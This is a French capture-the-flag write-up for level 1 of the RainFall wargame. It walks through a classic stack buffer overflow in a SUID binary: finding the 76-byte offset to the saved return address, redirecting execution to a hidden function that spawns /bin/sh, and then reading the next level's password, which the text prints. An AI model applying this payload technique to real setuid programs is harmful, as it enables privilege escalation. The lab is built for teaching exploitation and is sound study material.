# LEVEL1

Le systeme de fichier se présente de cette manière:

```Diff
level1@RainFall:~$ ls -la
total 21
drwxrwxrwx+ 1 level1 level1  140 May 12 15:42 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
r--------+ 1 level1 level1    0 May 12 15:27 .bash_history
rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
dr-x------+ 2 level1 level1   40 May 12 15:42 .cache
r--r-----+ 1 level1 level1   29 May 12 15:19 .gdbinit
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Le fichier `level1` est un exécutable.

Le bit `SUID` est activé, l'utilisateur `level1` peut exécuter le programme avec les droits de `level2`.

En observant le code assembleur, on peut voir une fonction `run` cachée (elle n'est jamais appellée), dans laquelle se trouve un appel à la fonction `system`:

```Diff
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+  0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret
```

Via gdb on peut obtenir le programme qui sera lancé par `system`:

```Diff
(gdb) x/s *(char**)$esp
+0x8048584:	 "/bin/sh"
```

C'est donc un shell qui sera exécuter avec les droits de `level2`. On va donc pouvoir `cat` le fichier `.pass` présent dans le `home` du user `level2`.

On observe aussi dans le `main` que de la mémoire est réservée dans la `stack` pour stocker le retour de la fonction `gets`:

```Diff
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
+  0x08048486 <+6>:	sub    esp,0x50
+  0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret
```

Ici on a `sub esp,0x50` donc `5 * 16 = 80` bytes réservés. Mais avec l'instruction suivante `lea eax,[esp+0x10]` le buffer pour `gets` commence à 16 bytes plus haut que `esp` soit un buffer de `80 - 16 = 64` bytes.

On va utiliser ce buffer pour, via un `buffer overflow`, injecter dans `eip` l'adresse de la fonction `run` pour que celle-ci soit exécutée.

En effet, le registre `eip` contient l'adresse de retour d'une fonction, autrement dit l'adresse de la prochaine instruction. En injectant dans `eip` l'adresse de la fonction `run`, à la fin du `gets` la prochaine instruction sera la fonction `run` elle-même.

Pour celà il nous faut déterminer la taille de la mémoire entre `esp+0x10` et `eip`, soit l' `offset` et écrire le payload envoyé à la fonction `gets` pour overflow le buffer.

On sait que notre buffer fait 64 bytes. On y ajoute les 4 bytes de la sauvegarde du registre `ebp` et 4 bytes pour `eip` => `72 bytes`.
En prenant en compte les éventuels bytes supplémentaires pour l'alignement de la stack, `eip` pourrait probablement se situer entre `72`, `76` ou `80` bytes après `esp+0x10`.

Pour vérifier ça on va injecter des char `A` et 4 char `B` (4 bytes soit la taille de `eip`) dans le buffer, voir à quel moment le programe segfault et à ce moment précis, si nos char `B` sont présent dans `eip`.

Pour être plus clair, admettons que l'offset soit de `76 bytes`. On va écrire un petit programme python pour print `76 "A"` pour remplir le `buffer + ebp + alignement` et `4 "B"` pour remplir `eip` et l'on va stocker ce programme dans un fichier payload:

```
level1@RainFall:~$ python2 -c 'print "A"*76 + "B"*4' > payload
```

Ensuite on lance le programme sous gdb en lui redirigeant le fichier payload, ainsi la fonction `gets` va remplir son buffer avec ce que notre programme python aura print.

```Diff
(gdb) run < payload
Starting program: /home/user/level1/level1 < payload

Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
(gdb) 
```

On voit que le programme a segfault à `0x42424242`, c'est à dire qu'à la fin du `gets` le registre `eip` contenait `0x42424242`. Et ça tombe bien ! Car en ascii `0x42 = "B"`, ce sont nos 4 char "B". La taille de l'offset est de `76 bytes`.

Il nous reste plus qu'à remplacer les 4 char `"B"` par l'adresse de la fonction `run` (`0x08048444`) en `little-endian`, à savoir `\x44\x84\x04\x08`

```
(echo $(python2 -c 'import sys; sys.stdout.write("A"*76 + "\x44\x84\x04\x08")'); cat) | ./level1
```

Dans la commande ci dessus :

- `echo $(python2 -c 'import sys; sys.stdout.write("A"*76 + "\x44\x84\x04\x08")')` => Permet d'envoyer à `gets` notre payload.
- `cat` => permet de garder le pipe ouvert et d'envoyer des commandes au shell qui sera ouvert par le programme `level1` et la fonction `run`.

```Diff
level1@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A"*76 + "\x44\x84\x04\x08")'); cat) | ./level1
Good... Wait what?
id
+uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
```

On voit bien ici que l'on peut executer la commande `id` et que `euid=2021(level2)`. On a les droits du user `level2`.

Pour finir il suffit juste de print le fichier `.pass` dans le home du user level2.

```
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```